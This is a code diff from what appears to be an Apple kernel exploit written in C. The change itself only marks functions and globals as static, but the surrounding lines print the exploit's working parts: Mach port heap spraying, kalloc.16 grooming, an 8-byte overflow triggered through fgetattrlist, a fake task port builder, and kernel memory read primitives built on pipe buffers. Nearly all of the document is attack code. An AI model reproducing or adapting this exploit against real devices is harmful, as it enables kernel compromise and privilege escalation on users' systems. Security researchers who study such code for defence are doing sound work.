@@ -81,10 +81,10 @@ static void build_fake_task_port(uint8_t* fake_port, uint64_t fake_port_kaddr, u
 }
 
 #define N_EARLY_PORTS 80000
-mach_port_t early_ports[N_EARLY_PORTS + 20000];
-int next_early_port = 0;
+static mach_port_t early_ports[N_EARLY_PORTS + 20000];
+static int next_early_port = 0;
 
-void alloc_early_ports()
+static void alloc_early_ports()
 {
     for (int i = 0; i < N_EARLY_PORTS; i++) {
         kern_return_t err;
@@ -96,7 +96,7 @@ void alloc_early_ports()
     next_early_port = N_EARLY_PORTS - 1;
 }
 
-mach_port_t steal_early_port()
+static mach_port_t steal_early_port()
 {
     if (next_early_port == 0) {
         LOG("out of early ports");
@@ -108,14 +108,14 @@ mach_port_t steal_early_port()
     return p;
 }
 
-void dump_early_ports()
+static void dump_early_ports()
 {
     for (int i = 0; i < N_EARLY_PORTS; i++) {
         LOG("EARLY %d %08x", i, early_ports[i]);
     }
 }
 
-void clear_early_ports()
+static void clear_early_ports()
 {
     for (int i = 0; i < next_early_port; i++) {
         mach_port_destroy(mach_task_self(), early_ports[i]);
@@ -129,7 +129,7 @@ struct kalloc_16_send_msg {
     uint8_t pad[0x200];
 };
 
-mach_port_t kalloc_16()
+static mach_port_t kalloc_16()
 {
     kern_return_t err;
     // take an early port:
@@ -175,10 +175,10 @@ mach_port_t kalloc_16()
 }
 
 #define N_MIDDLE_PORTS 50000
-mach_port_t middle_ports[N_MIDDLE_PORTS];
-int next_middle_port = 0;
+static mach_port_t middle_ports[N_MIDDLE_PORTS];
+static int next_middle_port = 0;
 
-mach_port_t alloc_middle_port()
+static mach_port_t alloc_middle_port()
 {
     mach_port_t port;
     kern_return_t err;
@@ -198,7 +198,7 @@ struct ool_multi_msg {
 };
 
 // to free them either receive the message or destroy the port
-mach_port_t hold_kallocs(uint32_t kalloc_size, int allocs_per_message, int messages_to_send, mach_port_t holder_port, mach_port_t* source_ports)
+static mach_port_t hold_kallocs(uint32_t kalloc_size, int allocs_per_message, int messages_to_send, mach_port_t holder_port, mach_port_t* source_ports)
 {
     if (messages_to_send > MACH_PORT_QLIMIT_LARGE) {
         LOG("****************** too many messages");
@@ -277,8 +277,8 @@ mach_port_t hold_kallocs(uint32_t kalloc_size, int allocs_per_message, int messa
     return port;
 }
 
-uint8_t msg_buf[10000];
-void discard_message(mach_port_t port)
+static uint8_t msg_buf[10000];
+static void discard_message(mach_port_t port)
 {
     mach_msg_header_t* msg = (mach_msg_header_t*)msg_buf;
     kern_return_t err;
@@ -298,12 +298,12 @@ void discard_message(mach_port_t port)
 
 #include <sys/attr.h>
 
-int vfs_fd = -1;
-struct attrlist al = { 0 };
-size_t attrBufSize = 16;
-void* attrBuf = NULL;
+static int vfs_fd = -1;
+static struct attrlist al = { 0 };
+static size_t attrBufSize = 16;
+static void* attrBuf = NULL;
 
-void prepare_vfs_overflow()
+static void prepare_vfs_overflow()
 {
     vfs_fd = open("/", O_RDONLY);
     if (vfs_fd == -1) {
@@ -319,23 +319,23 @@ void prepare_vfs_overflow()
 }
 
 // this will do a kalloc.16, overflow out of it with 8 NULL bytes, then free it
-void do_vfs_overflow()
+static void do_vfs_overflow()
 {
     int options = 0;
     int err = fgetattrlist(vfs_fd, &al, attrBuf, attrBufSize, options);
     //LOG("err: %d", err);
 }
 
-mach_port_t initial_early_kallocs[80000];
-int next_early_kalloc = 0;
+static mach_port_t initial_early_kallocs[80000];
+static int next_early_kalloc = 0;
 
-mach_port_t middle_kallocs[80000];
-int next_middle_kalloc = 0;
+static mach_port_t middle_kallocs[80000];
+static int next_middle_kalloc = 0;
 
 // in the end I don't use these, but maybe they help?
 
-volatile int keep_spinning = 1;
-void* spinner(void* arg)
+static volatile int keep_spinning = 1;
+static void* spinner(void* arg)
 {
     while (keep_spinning)
         ;
@@ -343,9 +343,9 @@ void* spinner(void* arg)
 }
 
 #define N_SPINNERS 100
-pthread_t spin_threads[N_SPINNERS];
+static pthread_t spin_threads[N_SPINNERS];
 
-void start_spinners()
+static void start_spinners()
 {
     return;
     for (int i = 0; i < N_SPINNERS; i++) {
@@ -353,7 +353,7 @@ void start_spinners()
     }
 }
 
-void stop_spinners()
+static void stop_spinners()
 {
     return;
     keep_spinning = 0;
@@ -362,15 +362,15 @@ void stop_spinners()
     }
 }
 
-const int total_fds = 14 * 0x1f * 8;
-int read_ends[total_fds];
-int write_ends[total_fds];
-int next_pipe_index = 0;
+static const int total_fds = 14 * 0x1f * 8;
+static int read_ends[total_fds];
+static int write_ends[total_fds];
+static int next_pipe_index = 0;
 
 static mach_port_t early_read_port = MACH_PORT_NULL;
-int early_read_read_fd = -1;
-int early_read_write_fd = -1;
-uint64_t early_read_known_kaddr = 0;
+static int early_read_read_fd = -1;
+static int early_read_write_fd = -1;
+static uint64_t early_read_known_kaddr = 0;
 
 // read_fd and write_fd are the pipe fds which have a pipe buffer at known_addr
 static void prepare_early_read_primitive(mach_port_t target_port, int read_fd, int write_fd, uint64_t known_kaddr)
@@ -381,7 +381,7 @@ static void prepare_early_read_primitive(mach_port_t target_port, int read_fd, i
     early_read_known_kaddr = known_kaddr;
 }
 
-uint32_t early_rk32(uint64_t kaddr)
+static uint32_t early_rk32(uint64_t kaddr)
 {
     uint8_t* buf = malloc(0xfff);
     read(early_read_read_fd, buf, 0xfff);
@@ -398,7 +398,7 @@ uint32_t early_rk32(uint64_t kaddr)
     return val;
 }
 
-uint64_t early_rk64(uint64_t kaddr)
+static uint64_t early_rk64(uint64_t kaddr)
 {
     uint64_t lower = (uint64_t)early_rk32(kaddr);
     uint64_t upper = (uint64_t)early_rk32(kaddr + 4);
